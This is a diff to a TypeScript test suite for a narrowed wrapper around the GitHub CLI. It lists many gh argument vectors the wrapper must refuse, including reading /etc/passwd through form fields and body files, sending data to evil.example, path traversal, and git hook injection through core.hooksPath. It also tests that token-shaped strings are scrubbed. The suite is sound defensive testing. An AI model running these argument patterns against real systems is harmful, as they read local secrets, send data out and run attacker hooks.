@@ -470,9 +470,86 @@ describe('gh runs as an account, narrowed (review HIGH 1)', () => {
     ['api', '/x', '-F', 'data=@/etc/passwd'],
     ['api', '/x', '--field', 'data=@/etc/passwd'],
     ['api', '/x', '--field=data=@/etc/passwd'],
+    ['api', '/x', '-F', 'n=1'],
+    ['api', 'graphql', '-iFquery=@/etc/passwd'],
+    ['api', 'graphql', '-iF', 'query=@/tmp/q'],
+    ['api', 'graphql', '-f', 'query=@/tmp/q'],
+    ['api', 'graphql', '-fquery=@/tmp/q'],
+    ['api', '@/etc/passwd'],
+    ['api', '/x', '--', '--input', '/etc/passwd'],
+    ['api', '/x', '-i'],
+    ['api', '/x', '--include'],
+    ['api', '/x', '--cache', '1h'],
+    ['api', '/x', '-t', '{{.}}'],
+    ['api', '/x', '--template', '{{.}}'],
+    ['api', '/x', '-H'],
+    ['api', '/x', '-X', 'TRACE'],
+    ['api', '/x', '-H', 'Host: evil.example'],
+    ['api', '/x', '-f', 'noequals'],
+    ['api', '/x', '/y'],
+    ['api', '../etc/passwd'],
+    ['api', '/repos/../../x'],
+    ['api', '//evil.example/x'],
+    ['api', 'https://api.github.com.evil.example/x'],
+    ['api', 'https://github.com/o/r'],
+    ['api'],
+    ['https://evil.example/collect'],
     ['api', 'https://evil.example/collect'],
     ['api', 'http://api.github.com/user'],
     ['repo', 'view', 'ghe.example.com/o/r'],
+    // Anything that starts git or touches a local file is out of this seam.
+    ['repo', 'clone', 'o/r'],
+    ['repo', 'clone', 'o/r', '/any/dir'],
+    ['repo', 'clone', 'o/r', '--', '-c', 'core.hooksPath=/tmp/hooks'],
+    ['repo', 'clone', 'o/r', '--', '--config', 'core.hooksPath=/tmp/hooks'],
+    ['repo', 'clone', 'o/r', '--', '--template=/tmp/tpl'],
+    ['repo', 'create', 'x', '--source', '.', '--push'],
+    ['repo', 'create', '--source=/tmp/x', '--push'],
+    ['repo', 'fork', 'o/r'],
+    ['repo', 'sync', 'o/r'],
+    ['repo', 'edit', 'o/r'],
+    ['repo', 'view', 'o/r', '--', '--x'],
+    ['pr', 'checkout', '1'],
+    ['pr', 'create', '-dF', '/path'],
+    ['pr', 'create', '-dF/path'],
+    ['pr', 'create', '-d', '-F', '/path'],
+    ['pr', 'create', '--body-file=/etc/passwd'],
+    ['pr', 'create', '--template', 'x'],
+    ['pr', 'create', '-T', 'x'],
+    ['pr', 'create', '--title', 't', '--', '--x'],
+    ['pr', 'view', '../x'],
+    ['pr', 'view', './x'],
+    ['pr', 'view', '~/x'],
+    ['pr', 'view', '--json=/etc/passwd'],
+    ['pr', 'develop'],
+    ['pr', 'status'],
+    ['pr', 'ready'],
+    ['pr', 'lock'],
+    ['issue', 'develop', '1'],
+    ['issue', 'transfer', '1', 'o/r'],
+    ['issue', 'comment', '1', '-F', 'x'],
+    ['issue', 'comment', '1', '--body-file', '-'],
+    ['release', 'upload', 'v1', '/etc/passwd'],
+    ['release', 'create', 'v1', '/etc/passwd'],
+    ['release', 'create', 'v1'],
+    ['release', 'download', 'v1'],
+    ['release', 'delete', 'v1'],
+    ['run', 'download', '1'],
+    ['run', 'delete', '1'],
+    ['workflow', 'run', 'ci.yaml'],
+    ['workflow', 'enable', 'ci.yaml'],
+    ['search'],
+    ['search', 'secrets', 'x'],
+    ['search', '--', 'x'],
+    ['pr'],
+    ['constructor', 'view'],
+    ['toString'],
+    ['pr', 'constructor'],
+    ['gist', 'create'],
+    ['ssh-key', 'add'],
+    ['gpg-key', 'add'],
+    ['secret', 'list'],
+    ['variable', 'list'],
     [],
   ];
   for (const args of REFUSED)
@@ -482,22 +559,40 @@ describe('gh runs as an account, narrowed (review HIGH 1)', () => {
       expect(calls).toHaveLength(0);
     });
 
-  test('allows the commands the units need, and github.com addresses', async () => {
+  test('allows the API work the units need, and github.com addresses', async () => {
     const { port, calls } = await ready();
     const ok: string[][] = [
       ['api', '/repos/o/r/pulls'],
+      ['api', 'repos/o/r/pulls', '--paginate', '--jq', '.[].number'],
       ['api', 'https://api.github.com/user'],
-      ['api', '/x', '-F', 'n=1', '-f', 'body=hello'],
+      ['api', '-X', 'POST', '/repos/o/r/issues', '-f', 'title=hi', '-f', 'body=a/b ./c'],
+      ['api', '--method=PATCH', '/repos/o/r/issues/1', '--raw-field=state=closed'],
+      ['api', 'graphql', '-f', 'query={ viewer { login } }', '-H', 'Accept: application/vnd.github+json'],
+      ['api', '/search/issues?q=repo:o/r+is:open', '-q', '.items | length'],
+      ['pr', 'list'],
       ['pr', 'view', 'https://github.com/o/r/pull/1'],
+      ['pr', 'view', '1', '-R', 'o/r', '--json', 'title,state'],
+      ['pr', 'diff', '1'],
+      ['pr', 'checks', '1'],
+      ['pr', 'create', '-d', '--title', 't', '--body', 'b', '--head', 'x', '--base', 'main'],
+      ['pr', 'comment', '1', '--body', 'thanks'],
+      ['pr', 'merge', '1', '--squash'],
+      ['issue', 'list', '--assignee', '@me'],
+      ['issue', 'create', '--title', 't', '--body', 'b'],
       ['run', 'list'],
+      ['run', 'view', '1', '--log-failed'],
+      ['run', 'rerun', '1'],
+      ['workflow', 'list'],
+      ['workflow', 'view', 'ci.yaml'],
       ['repo', 'view', 'github.com/o/r'],
-      ['issue', 'list'],
-      ['workflow', 'run', 'ci.yaml'],
+      ['repo', 'view', 'o/r'],
       ['release', 'list'],
+      ['release', 'view', 'v1'],
       ['search', 'prs', 'x'],
+      ['search', 'repos', 'topic:bun', '--limit', '5'],
     ];
     for (const args of ok) await run(port, args);
-    expect(calls.map(call => call.args[0])).toEqual(ok.map(args => args[0]));
+    expect(calls.map(call => call.args.join(' '))).toEqual(ok.map(args => args.join(' ')));
   });
 
   test('the child runs in an empty private folder that is its HOME and gh config, with nothing interactive', async () => {
@@ -548,8 +643,8 @@ describe('gh runs as an account, narrowed (review HIGH 1)', () => {
   });
 
   test('output is scrubbed of the exact token and of any GitHub-token-shaped text', async () => {
-    const other = 'ghp_' + 'a1B2c3D4'.repeat(5);
-    const pat = 'github_pat_11ABCDEFG0abcdefghijkl_' + 'Z9y8X7w6'.repeat(6);
+    const other = `ghp_${'a1B2c3D4'.repeat(5)}`;
+    const pat = `github_pat_11ABCDEFG0abcdefghijkl_${'Z9y8X7w6'.repeat(6)}`;
     const { port } = await ready(() => ({
       exitCode: 0,
       signal: null,
